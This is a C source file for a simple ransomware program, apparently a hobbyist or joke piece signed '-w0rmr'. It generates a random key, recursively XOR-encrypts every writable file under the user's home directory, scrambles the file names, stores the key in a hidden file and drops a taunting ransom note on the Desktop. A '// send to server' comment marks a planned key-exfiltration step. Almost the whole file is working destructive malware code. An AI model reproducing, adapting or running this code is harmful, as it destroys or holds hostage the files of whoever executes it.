// #include <cstddef>
// #include <cstddef>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/stat.h>



typedef struct data{
    char *message;
    char key[28];
    char *path;
    char key_name[1028];
    size_t key_size;
} data;

void xor_algo(char *data, size_t data_len, char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}


void encrypt_xor(char *path, data *p){
    size_t size;
    FILE *file = fopen(path, "r+b");
    if (!file) {
        perror("Failed to open file");
        return;
    }
    fseek(file, 0, SEEK_END);
    size = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *buffer = (char*)malloc(size);
    if (!buffer){
        perror("Failed to allocate memory");
        fclose(file);
        return;
    }
    fread(buffer, 1, size, file);
    xor_algo(buffer, size, p->key, 28);
    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, size, file);
    free(buffer);
    fclose(file);
}

void bad_trip(char *path, data *info) {
    DIR *dir = opendir(path);
    struct dirent *entry;
    if (dir == NULL) {
        return;
    }
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") && strcmp(entry->d_name, "..") && strcmp(entry->d_name, "Library") && strcmp(entry->d_name , "env") && strcmp(entry->d_name , " ")) {
            char full_path[1024];
            snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
            struct stat st;
            if (stat(full_path, &st) == 0 && entry->d_name[0] != '.') {
                if (S_ISDIR(st.st_mode) && strcmp(entry->d_name, "Library")) {
                    bad_trip(full_path, info);
                } else {
                    if (st.st_mode & S_IWUSR){
                        encrypt_xor(full_path, info);
                        char encrypted_name[3000];
                        strcpy(encrypted_name, entry->d_name);
                        xor_algo(encrypted_name, strlen(encrypted_name), info->key, info->key_size);
                        char new_full_path[3000];
                        snprintf(new_full_path, sizeof(new_full_path), "%s/%s", path, encrypted_name);
                        if (rename(full_path, new_full_path) != 0) {
                            perror("Failed to rename file");
                        }
                        printf("%s\n",path);
                    }
                }
            }
        }
    }
    closedir(dir);
}
void generate_key(char* key, size_t length) {
    char characters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()__+/";
    FILE* urandom = fopen("/dev/urandom", "r");
    if (urandom == NULL) {
        fprintf(stderr, "Failed to open /dev/urandom\n");
        exit(1);
    }
    for (size_t i = 0; i < length; i++) {
        unsigned char random_value;
        fread(&random_value, sizeof(random_value), 1, urandom);
        key[i] = characters[random_value % (sizeof(characters) - 1)];
    }
    key[length] = '\0';
    fclose(urandom);
}

int write_in_file(char *path , char *message)
{
    int fd = open(path, O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
    // printf("\'%s\'\n",path);
    if(fd == -1){
        write(2,"bad trip",strlen("bad trip"));
        return(1);
    }
    write(fd, message, strlen(message));
    close(fd);
    return 0;

}

void leave_message(data *d)
{
    char *path = malloc(strlen(d->path )+ 4);
    strcpy(path, d->path);
    path[strlen(path) - 1] = '/';
    path[strlen(path) ] = ' ';
    path[strlen(path) - 1]  = '\0';
    // printf("key = %s path = %s  key path = \'%s\'  \n",d->key , d->path ,path);
    // send to server
    write_in_file(path,d->key);
    char readme_path[3000];
    snprintf(readme_path, sizeof(readme_path), "%s/%s", d->path, "/Desktop/readme.txt");
    write_in_file(readme_path,d->message);
}

void ransome_ware(data *d)
{
    generate_key(d->key, d->key_size);
    bad_trip(d->path, d);
    leave_message(d);
}

/* Usage */
int main() {
    data p;
    p.key_size = 28;
    p.message =  "haha t hackity by rrakman ila tlaqitih 3tih 10dh o golo ywrik fin kayn l key ola reversy l binary :') \n-w0rmr\n";
    p.path = getenv("HOME");
    ransome_ware(&p);
    return 0;
}
